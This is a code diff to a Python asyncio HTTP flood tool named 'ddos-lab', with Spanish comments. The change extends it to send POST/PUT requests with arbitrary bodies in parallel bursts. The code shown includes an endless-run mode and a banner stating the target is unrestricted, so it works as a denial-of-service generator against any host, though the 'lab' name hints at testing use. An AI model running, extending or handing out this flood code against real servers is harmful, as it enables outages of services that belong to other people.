@@ -71,17 +71,32 @@ def clamp(name: str, value: float, maximum: float) -> float:
     return value
 
 
+def build_request(method: str, path: str, host_header: str, data: str, content_type: str) -> bytes:
+    """Construye una peticion HTTP/1.1 (GET o POST/PUT con cuerpo)."""
+    headers = [
+        f"{method} {path} HTTP/1.1",
+        f"Host: {host_header}",
+        "User-Agent: ddos-lab/2.0",
+        "Accept: */*",
+    ]
+    body = data.encode() if data else b""
+    if body:
+        headers.append(f"Content-Type: {content_type}")
+        headers.append(f"Content-Length: {len(body)}")
+    headers.append("Connection: close")
+    return ("\r\n".join(headers) + "\r\n\r\n").encode() + body
+
+
 async def _one(
     ip: str,
     port: int,
-    path: str,
-    host_header: str,
+    request: bytes,
     sni: str,
     ctx,
     timeout: float,
     sem,
 ) -> tuple[int, float]:
-    """Una peticion GET. Devuelve (codigo, latencia_ms); 0 si no hubo respuesta."""
+    """Una peticion. Devuelve (codigo, latencia_ms); 0 si no hubo respuesta."""
     started = time.perf_counter()
     async with sem:
         try:
@@ -95,15 +110,7 @@ async def _one(
             return 0, (time.perf_counter() - started) * 1000
 
         try:
-            writer.write(
-                (
-                    f"GET {path} HTTP/1.1\r\n"
-                    f"Host: {host_header}\r\n"
-                    "User-Agent: ddos-lab/2.0\r\n"
-                    "Accept: */*\r\n"
-                    "Connection: close\r\n\r\n"
-                ).encode()
-            )
+            writer.write(request)
             await asyncio.wait_for(writer.drain(), timeout=timeout)
             head = await asyncio.wait_for(reader.readuntil(b"\r\n"), timeout=timeout)
             parts = head.split()
@@ -120,13 +127,11 @@ async def _one(
 
 
 async def _burst(
-    ip, port, path, host_header, sni, ctx, requests, timeout, sem
+    ip, port, request, sni, ctx, requests, timeout, sem
 ) -> list[tuple[int, float]]:
     """Lanza `requests` peticiones en paralelo, acotadas por el semaforo."""
     tasks = [
-        asyncio.create_task(
-            _one(ip, port, path, host_header, sni, ctx, timeout, sem)
-        )
+        asyncio.create_task(_one(ip, port, request, sni, ctx, timeout, sem))
         for _ in range(requests)
     ]
     return await asyncio.gather(*tasks)
@@ -154,12 +159,14 @@ async def run(args, ip, host_header) -> None:
     print("=" * 66)
     scheme = "https" if args.https else "http"
     port_suffix = "" if args.port in (80, 443) else f":{args.port}"
-    print(f"  DESTINO   : {scheme}://{args.dns}{port_suffix}{args.path}  ->  {ip}")
+    print(f"  DESTINO   : {args.method} {scheme}://{args.dns}{port_suffix}{args.path}  ->  {ip}")
     print(f"  PATRON    : {requests} peticiones cada {every:g}s"
           f"  ({requests / every:.0f} req/s por contenedor)")
     print(f"  MODO      : {'INFINITO (Ctrl+C para parar)' if args.forever else f'{args.duration:g}s'}")
     print(f"  AMBITO    : destino libre (sin restriccion de red)")
     print("=" * 66, flush=True)
+
+    request = build_request(args.method, args.path, host_header, args.data, args.content_type)
 
     ctx = None
     if args.https:
@@ -193,8 +200,7 @@ async def run(args, ip, host_header) -> None:
         results = await _burst(
             ip,
             args.port,
-            args.path,
-            host_header,
+            request,
             args.dns,
             ctx,
             requests,
@@ -263,6 +269,9 @@ def main() -> None:
     parser.add_argument("--dns", required=True, help="nombre DNS o IP del destino")
     parser.add_argument("--port", type=int, default=None, help="puerto del destino (def. 80, o 443 con --https)")
     parser.add_argument("--path", default="/", help="ruta HTTP (def. /)")
+    parser.add_argument("--method", default="GET", help="metodo HTTP (GET, POST, PUT, ...)")
+    parser.add_argument("--data", default="", help="cuerpo de la peticion (para POST/PUT)")
+    parser.add_argument("--content-type", default="application/json", help="Content-Type cuando hay --data")
     parser.add_argument("--requests", type=int, default=50, help="peticiones por rafaga")
     parser.add_argument("--every", type=float, default=1.0, help="segundos entre rafagas")
     parser.add_argument("--duration", type=float, default=30.0, help="segundos totales")
